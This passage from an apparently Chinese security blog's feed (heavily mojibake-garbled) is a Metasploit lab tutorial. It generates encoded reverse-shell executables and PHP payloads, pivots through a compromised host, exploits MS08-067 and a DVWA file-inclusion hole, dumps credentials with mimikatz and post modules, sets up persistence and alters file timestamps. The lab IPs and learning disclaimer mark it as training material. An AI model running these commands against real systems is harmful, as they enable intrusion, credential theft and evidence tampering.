é»˜è®¤ä¸ºmtime</span><br><span class="line">stat 1.txt # åˆ—å‡ºå…¨éƒ¨æ—¶é—´</span><br><span class="line">touch -d &quot;2 days ago&quot; 1.txt # ä¿®æ”¹MAæ—¶é—´</span><br><span class="line">touch -t 1501010101 1.txt # ä¿®æ”¹ç²¾ç¡®æ—¶é—´ï¼Œå¹´æœˆæ—¥</span><br><span class="line"></span><br><span class="line">åœ¨meterpreterä¸‹ä¿®æ”¹æ—¶é—´ï¼š</span><br><span class="line">meterpreter &gt; timestomp -v 111 # æŸ¥çœ‹111æ–‡ä»¶çš„MACæ—¶é—´</span><br><span class="line">timestomp -f C:\\WINDOWS\\0.log 111 # -fä¸ºæŒ‡å®šä¸€ä¸ªæ¨¡æ¿ï¼Œå°†111çš„æ—¶é—´æ”¹ä¸º0.logçš„æ—¶é—´</span><br><span class="line"></span><br><span class="line">timestomp -a &quot;11/11/2018 11:11:11&quot; 111 # æŒ‡å®šä¿®æ”¹Açš„æ—¶é—´</span><br><span class="line">timestomp -m &quot;11/11/2018 11:11:11&quot; 111 # æŒ‡å®šä¿®æ”¹Mçš„æ—¶é—´</span><br><span class="line">timestomp -c &quot;11/11/2018 11:11:11&quot; 111 # æŒ‡å®šä¿®æ”¹Mçš„æ—¶é—´</span><br><span class="line">timestomp -z &quot;11/11/2024 11:11:11&quot; 111 # ä¸€æ¬¡ä¿®æ”¹ä¸‰ä¸ªæ—¶é—´</span><br><span class="line">timestomp -e &quot;11/11/2020 11:11:11&quot; 111 # æŒ‡å®šä¿®æ”¹E(Entry Modified)æ—¶é—´</span><br><span class="line">Entry Modifiedä¸ºMFTï¼Œä¸ºNTFSçš„æ–‡ä»¶ç³»ç»Ÿçš„ä¸»æ–‡ä»¶åˆ†é…è¡¨</span><br><span class="line">-b -r ä¸ºæ“¦é™¤MACEæ—¶é—´è¡¨ï¼Œç›®å‰å·²å¤±æ•ˆã€‚</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200706141936093.png" class><h3 id="æ¡ˆä¾‹å…­ã€ä½¿ç”¨Pivotingï¼ˆåŸºäºè·¯ç”±ï¼‰å®ç°è·³æ¿-æ¢çº½-æ”¯ç‚¹get-shell"><a href="#æ¡ˆä¾‹å…­ã€ä½¿ç”¨Pivotingï¼ˆåŸºäºè·¯ç”±ï¼‰å®ç°è·³æ¿-æ¢çº½-æ”¯ç‚¹get-shell" class="headerlink" title="æ¡ˆä¾‹å…­ã€ä½¿ç”¨Pivotingï¼ˆåŸºäºè·¯ç”±ï¼‰å®ç°è·³æ¿/æ¢çº½/æ”¯ç‚¹get shell"></a>æ¡ˆä¾‹å…­ã€ä½¿ç”¨Pivotingï¼ˆåŸºäºè·¯ç”±ï¼‰å®ç°è·³æ¿/æ¢çº½/æ”¯ç‚¹get shell</h3><h4 id="1-å®éªŒæ‹“æ‰‘"><a href="#1-å®éªŒæ‹“æ‰‘" class="headerlink" title="1.å®éªŒæ‹“æ‰‘"></a>1.å®éªŒæ‹“æ‰‘</h4><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707152622464.png" class><h4 id="2-å®éªŒç›®çš„"><a href="#2-å®éªŒç›®çš„" class="headerlink" title="2.å®éªŒç›®çš„"></a>2.å®éªŒç›®çš„</h4><blockquote><p>1.kaliä½¿ç”¨msfç”Ÿæˆåä¸ºhaha.exeçš„æ‰§è¡Œç¨‹åºï¼Œå¹¶è¯±ä½¿win_2k03æ‰§è¡Œï¼Œç„¶ååå¼¹ç»™kaliä¸€ä¸ªmeterpreter shellã€‚</p><p>2.å¾—åˆ°shellåä»¥win_2k03ä¸ºè·³æ¿ï¼Œæ§åˆ¶win_XPã€‚</p></blockquote><h4 id="3-å®éªŒè¿‡ç¨‹"><a href="#3-å®éªŒè¿‡ç¨‹" class="headerlink" title="3.å®éªŒè¿‡ç¨‹"></a>3.å®éªŒè¿‡ç¨‹</h4><p>1.é…ç½®é˜²ç«å¢™m0n01ï¼Œé…ç½®NAT</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707153518682.png" class><p>2.é…ç½®WLANå…³é—­æ‹’ç»ç§æœ‰ç½‘æ®µè®¿é—®ï¼Œä½¿è®¿é—®å…¶ä»–ä¸»æœºè®¿é—®192.168.1.4èƒ½å¤Ÿå®ç°NATã€‚</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707153857414.png" class><p>3.é…ç½®m0n02è§„åˆ™ï¼Œå…è®¸å…¨éƒ¨ç½‘æ®µå¯ä»¥å‡ºå»</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155315502.png" class><p>4.æµ‹è¯•</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155229810.png" class><p>5.ç”Ÿæˆhaha.exe</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o haha.exe</span><br></pre></td></tr></table></figure><p>6.win_2k03ä¸‹è½½å¹¶è®¿é—®ï¼ˆè¯±éª—ï¼‰</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707155813729.png" class><p>7.kaliç›‘å¬ï¼Œwin_2k03è¿è¡Œhaha.exe</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.253.22  # è¿™é‡Œä¸æ˜¯192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707160150775.png" class><p>8.æ·»åŠ åˆ°è¾¾192.168.254.0çš„è·¯ç”±ï¼Œä½¿ä»¥å192.168.254.0çš„è·¯ç”±éƒ½èµ°session1</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707162846401.png" class><p>9.æ‰«æç½‘æ®µ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.254.20-192.168.254.30</span><br><span class="line">set ports 139,445</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°20ä¸22æ˜¯å­˜æ´»çš„</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707163857984.png" class><p>10.ä½¿ç”¨nmapæ‰«æï¼Œå¯ä»¥çœ‹åˆ°æ·»åŠ çš„è·¯ç”±å¯¹nmapæ²¡æœ‰ä½œç”¨ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap -A -p 445 -Pn 192.168.254.22</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707164742663.png" class><p>11.åˆ©ç”¨ms08067 get XP shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set rhosts 192.168.254.22</span><br><span class="line">set target 34</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>è¿™é‡Œwin2k03æŒ‚äº†ï¼Œæ‰€ä»¥æˆ‘æ¢äº†ä¸ªwin7ï¼Œä½†å‡ºç°äº†ä¸ªé—®é¢˜ã€‚å¼¹å‡ºäº†ä¸€ä¸ªæ¶ˆæ¯ç‚¹å‡»å…è®¸å°±å¯ä»¥å¾—åˆ°shellï¼Œä½†æˆ‘å¤±è´¥äº†ã€‚ã€‚ã€‚</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707214348635.png" class><p>æ¥babyè®©æˆ‘ä»¬æ¢ä¸ªæ€è·¯ï¼Œç«Ÿç„¶åå¼¹ç»™win2k03å¤±è´¥ï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½åå¼¹ç»™ä»–çš„ä¸Šä¸€çº§m0n0çš„wlanå£ï¼Œç†è®ºä¸Šæ˜¯å¯ä»¥ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»åŠ äº†ä¸€æ¡192.168.254.0/24çš„è·¯ç”±ï¼Œå¹¶ä¸”ç½‘å…³ä¸ºsession9ï¼Œå°è¯•ä¸€ä¸‹æ˜¯å¯ä»¥çš„ã€‚</p><p>è¿™é‡Œåœ¨è¿æ¥win2k03çš„sessionä¸­ä¸€å®šè¦åŠ 192.168.254.0/24çš„è·¯ç”±</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221947516.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>å·²ç»æ‹¿åˆ°win_XPçš„shell</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221620618.png" class><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707222926242.png" class><p>ä¸¤ä¸ªshelléƒ½æ‹¿åˆ°æ‰‹äº†ã€‚</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707221906308.png" class><p>é‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹çš„shellå¹¶ä¸æ˜¯ä»win2k03æ‹¿åˆ°çš„ï¼Œå¦‚ä¸‹å›¾ï¼Œè€Œæ˜¯ç”±session 9å»ºç«‹è¿æ¥ï¼Œå‘é€XP payloadï¼Œæ‰§è¡Œåç›´æ¥åå¼¹ç»™m0n0çš„wlanå£ï¼Œå¹¶ä¸ç»è¿‡win2k03ã€‚</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707223402391.png" class><p>å†çœ‹ä¸€ä¸‹win2k03ï¼ˆwin7ï¼‰</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707222635457.png" class><p>ç»¼ä¸Šï¼Œå®éªŒå®Œæˆã€‚</p><h3 id="æ¡ˆä¾‹ä¸ƒã€ä½¿ç”¨Pivotingï¼ˆåŸºäºç«¯å£è½¬å‘ï¼‰å®ç°è·³æ¿-æ¢çº½-æ”¯ç‚¹get-shell"><a href="#æ¡ˆä¾‹ä¸ƒã€ä½¿ç”¨Pivotingï¼ˆåŸºäºç«¯å£è½¬å‘ï¼‰å®ç°è·³æ¿-æ¢çº½-æ”¯ç‚¹get-shell" class="headerlink" title="æ¡ˆä¾‹ä¸ƒã€ä½¿ç”¨Pivotingï¼ˆåŸºäºç«¯å£è½¬å‘ï¼‰å®ç°è·³æ¿/æ¢çº½/æ”¯ç‚¹get shell"></a>æ¡ˆä¾‹ä¸ƒã€ä½¿ç”¨Pivotingï¼ˆåŸºäºç«¯å£è½¬å‘ï¼‰å®ç°è·³æ¿/æ¢çº½/æ”¯ç‚¹get shell</h3><p>åˆ é™¤session 9 çš„è·¯ç”±</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 192.168.254.0/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707224245019.png" class><p>æ·»åŠ ä¸€ä¸ªç«¯å£æ˜ å°„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -L 192.168.253.22 -l 3389 -r 192.168.254.22 -p 3389</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707224822057.png" class><p>æ‰§è¡Œï¼Œæ‹¿åˆ°shellã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# rdesktop 192.168.253.22</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707225206502.png" class><p>ç™»å…¥xpä¼šå¼¹è­¦å‘Š</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707225911526.png" class><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230006676.png" class><p>kaliè¿æ¥ä¸Šçš„æ—¶å€™xpç”¨æˆ·ä¼šæ³¨é”€</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230225787.png" class><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200707230115548.png" class><p>å®Œã€‚ã€‚ã€‚</p><h3 id="æ¡ˆä¾‹å…«ï¼Œå¤šsessionsè¿æ¥"><a href="#æ¡ˆä¾‹å…«ï¼Œå¤šsessionsè¿æ¥" class="headerlink" title="æ¡ˆä¾‹å…«ï¼Œå¤šsessionsè¿æ¥"></a>æ¡ˆä¾‹å…«ï¼Œå¤šsessionsè¿æ¥</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o a.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.4</span><br><span class="line">set exitonsession # æŒç»­ç›‘å¬4444ç«¯å£ï¼Œèƒ½å¤ŸåŒæ—¶è·å–å¤šä¸ªsession</span><br><span class="line">run -j -z</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709110800149.png" class><p>ä½¿ç”¨postæ¨¡å—è¿›è¡Œåæ¸—é€æµ‹è¯•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24 #æ‰«ææ•´ä¸ªç½‘æ®µ</span><br><span class="line">run post/windows/gather/checkvm # æ‰«æè™šæ‹Ÿæœº</span><br><span class="line">run post/windows/gather/credentials/credential_collector #ã€€æ‰«æèº«ä»½éªŒè¯ä¿¡æ¯(è´¦å·)token</span><br><span class="line">run post/windows/gather/enum_applications # æ‰«æå®‰è£…è½¯ä»¶çš„ä¿¡æ¯</span><br><span class="line">run post/windows/gather/enum_logged_on_users # æ‰«ææ­£å¤„äºç™»å…¥çš„è´¦å·(500ä¸ºç®¡ç†å‘˜)</span><br><span class="line">run post/windows/gather/enum_snmp # æŸ¥çœ‹snmpç›¸å…³é…ç½®</span><br><span class="line">run post/multi/recon/local_exploit_suggester # æ‰«ææœ¬åœ°å¯ä»¥ç”¨äºææƒçš„æ¼æ´æ¨¡å—</span><br><span class="line">run post/windows/manage/delete_user USERNAME=a # åˆ é™¤ç”¨æˆ·</span><br><span class="line">run post/multi/gather/env # æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒä¿¡æ¯</span><br><span class="line">run post/multi/gather/firefox_creds # æŸ¥çœ‹ç«ç‹æµè§ˆå™¨ä¿å­˜çš„å¯†ç </span><br><span class="line">run post/multi/gather/ssh_creds # æŸ¥çœ‹æœ¬åœ°ä¿å­˜çš„sshç”¨æˆ·åå¯†ç ä¿¡æ¯</span><br><span class="line">run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe # æ£€æŸ¥ç›®æ ‡ç³»ç»Ÿæ–‡ä»¶æ˜¯å¦ä¸ºæ¶æ„æ–‡ä»¶</span><br><span class="line">run hostsedit -e 192.168.1.4,www.baidu.com # ä¿®æ”¹hostsæ–‡ä»¶</span><br></pre></td></tr></table></figure><p>è®¾ç½®åˆ¶åŠ¨æ‰§è¡Œè„šæœ¬ï¼Œä½¿å¾—åˆ°çš„sessionè¿›ç¨‹ä¸ºexplorer</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; set AutorunScript migrate -n explorer.exe</span><br><span class="line">run -j -z</span><br><span class="line"></span><br><span class="line">set InitialAutoRunScript migrate -n explorer.exe</span><br><span class="line">set AutoRunScript post/windows/gather/dumplinks</span><br></pre></td></tr></table></figure><h3 id="æ¡ˆä¾‹ä¹ï¼Œå»ºç«‹æŒä¹…è¿æ¥"><a href="#æ¡ˆä¾‹ä¹ï¼Œå»ºç«‹æŒä¹…è¿æ¥" class="headerlink" title="æ¡ˆä¾‹ä¹ï¼Œå»ºç«‹æŒä¹…è¿æ¥"></a>æ¡ˆä¾‹ä¹ï¼Œå»ºç«‹æŒä¹…è¿æ¥</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A # åœ¨ç›®æ ‡æœºå™¨åˆ›å»ºä¸€ä¸ªç³»ç»ŸæœåŠ¡å¹¶å¯åŠ¨</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150301191.png" class><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150337750.png" class><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709150449642.png" class><p>è¿æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">set rhost  192.168.1.200</span><br><span class="line">set lport 31337</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>å…¶ä»–æ–¹æ³•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -X -r 192.168.1.200 -p 4444 -i 10 # å½“XPé‡å¯æ—¶ä¼šé‡æ–°è¿æ¥</span><br></pre></td></tr></table></figure><p>é‡å¯XPç›´è¿</p><h3 id="æ¡ˆä¾‹åï¼ŒMSFå»¶å±•Mimikatz"><a href="#æ¡ˆä¾‹åï¼ŒMSFå»¶å±•Mimikatz" class="headerlink" title="æ¡ˆä¾‹åï¼ŒMSFå»¶å±•Mimikatz"></a>æ¡ˆä¾‹åï¼ŒMSFå»¶å±•Mimikatz</h3><p>hashdumpå°±æ˜¯ä½¿ç”¨mimikatzçš„éƒ¨åˆ†åŠŸèƒ½</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å¯¼å…¥</span><br><span class="line">load mimikatz</span><br><span class="line">msv # æŸ¥çœ‹ç³»ç»Ÿç”¨æˆ·ä¿¡æ¯ï¼ˆhashï¼‰</span><br><span class="line">ssp # æŸ¥çœ‹ç”¨æˆ·æ˜æ–‡ä¿¡æ¯</span><br><span class="line">tspkg # ç¥¨æ®</span><br><span class="line">wdigest # å¯ä»¥æŸ¥çœ‹åˆ°å†…å­˜ä¸­å­˜åœ¨çš„ç”¨æˆ·åå¯†ç </span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709161910259.png" class><p>å‚æ•°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">load mimikatz</span><br><span class="line">wdigest Ìµkerberos Ìµmsv Ìµssp Ìµtspkg Ìµlivessp</span><br><span class="line">mimikatz_command -h</span><br><span class="line">mimikatz_command -f a::  # æŸ¥çœ‹å“ªäº›æ¨¡å—å¯ä»¥ä½¿ç”¨</span><br><span class="line">mimikatz_command -f samdump::hashes  # </span><br><span class="line">mimikatz_command -f handle::list  # æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹</span><br><span class="line">mimikatz_command -f service::list # æŸ¥çœ‹ç³»ç»ŸæœåŠ¡ï¼Œå¯ä»¥å¼€å¯æœåŠ¡ä¹Ÿå¯ä»¥åœæ­¢æœåŠ¡</span><br><span class="line">mimikatz_command -f crypto::listProviders  # æŸ¥çœ‹æ”¯æŒçš„åŠ å¯†å¥—ä»¶</span><br><span class="line">mimikatz_command -f winmine::infos # ç ´è§£æ‰«é›·æ¸¸æˆã€‚ã€‚ã€‚</span><br></pre></td></tr></table></figure><h3 id="æ¡ˆä¾‹åä¸€ï¼ŒPHP-shell"><a href="#æ¡ˆä¾‹åä¸€ï¼ŒPHP-shell" class="headerlink" title="æ¡ˆä¾‹åä¸€ï¼ŒPHP shell"></a>æ¡ˆä¾‹åä¸€ï¼ŒPHP shell</h3><p>é€šè¿‡æµè§ˆå™¨è®¿é—®æ‰§è¡Œphpæ–‡ä»¶æ‹¿åˆ°shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=3333 -f</span><br><span class="line">raw -o a.php</span><br><span class="line"></span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>æµè§ˆå™¨è®¿é—®</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709165542747.png" class><p>getshell</p><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200709165601746.png" class><h3 id="æ¡ˆä¾‹åäºŒï¼ŒRFI"><a href="#æ¡ˆä¾‹åäºŒï¼ŒRFI" class="headerlink" title="æ¡ˆä¾‹åäºŒï¼ŒRFI"></a>æ¡ˆä¾‹åäºŒï¼ŒRFI</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ä¿®æ”¹PHPé…ç½®æ–‡ä»¶ï¼Œå…è®¸è¿œç¨‹åŒ…å«</span><br><span class="line">vi /etc/php5/cgi/php.ini #php info é…ç½®æ–‡ä»¶</span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br><span class="line"></span><br><span class="line">MSFï¼š</span><br><span class="line">use exploit/unix/webapp/php_include</span><br><span class="line">set RHOST 192.168.1.5</span><br><span class="line">set PATH /dvwa/vulnerabilities/fi/</span><br><span class="line">set PHPURI /?page=XXpathXX  # ä¸ç®¡ä»€ä¹ˆéƒ½å¡«XXpathXX</span><br><span class="line">set HEADERS &quot;Cookie:security=low;PHPSESSID=r0p9hepkbrkcn01jjjqldsork2&quot;</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2020/08/18/MSF%E7%9A%84%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/image-20200711150428027.png" class>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x01-å†™åœ¨å‰é¢&quot;&gt;&lt;a href=&quot;#0x01-å†™åœ¨å‰é¢&quot; class=&quot;headerlink&quot; title=&quot;0x01.å†™åœ¨å‰é¢&quot;&gt;&lt;/a&gt;0x01.å†™åœ¨å‰é¢&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Metasploité¡¹ç›®&lt;/strong&gt;æ˜¯ä¸€ä¸ªæ—¨åœ¨æä¾›å®‰å…¨æ¼æ´ä¿¡æ¯è®¡ç®—æœºå®‰å…¨é¡¹ç›®ï¼Œå¯ä»¥ååŠ©å®‰å…¨å·¥ç¨‹å¸ˆè¿›è¡Œæ¸—é€æµ‹è¯•åŠå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ]ç­¾åå¼€å‘ã€‚metspolitæ¡†æ¶å…±æœ‰å››ä¸ªç‰ˆæœ¬ï¼ˆMetasploit Framework Editionï¼ŒMetasploit Community Editionï¼ŒMetasploit Expressï¼ŒMetasploit Proï¼‰ï¼ŒMSFä¸ºå…¶ä¸­çš„å¼€æºå…è´¹ç‰ˆæœ¬ï¼Œå…¶ä»–ä¸ºæ”¶è´¹ç‰ˆæœ¬ï¼Œä½†åŠŸèƒ½ä¹Ÿæ›´åŠ å¼ºå¤§ã€‚æœ€æ–°çš„MSFä¸ºMSF5.0ï¼Œ5.0æä¾›äº†æ–°çš„æ•°æ®æœåŠ¡ï¼Œå¼•å…¥äº†æ–°çš„å…æ€åŠŸèƒ½ï¼Œæ”¯æŒå¤šç§è¯­è¨€ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;å…è´£å£°æ˜ï¼šæœ¬æ–‡åªä¸ºå­¦ä¹ è®°å½•ï¼Œä»»ä½•äººéæ³•ä½¿ç”¨äº§ç”Ÿçš„ä»»ä½•åæœï¼Œä½œè€…æ¦‚ä¸è´Ÿè´£ï¼ï¼ï¼&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="kali" scheme="https://lunamoore.github.io/categories/kali/"/>
    
    
    <category term="linux" scheme="https://lunamoore.github.io/tags/linux/"/>
    
    <category term="security tools" scheme="https://lunamoore.github.io/tags/security-tools/"/>
    
  </entry>
  
  <entry>
    <title>Veil-Evasionå®‰è£…</title>
    <link href="https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/"/>
    <id>https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</id>
    <published>2020-08-18T06:54:46.000Z</published>
    <updated>2020-08-18T07:33:33.608Z</updated>
    
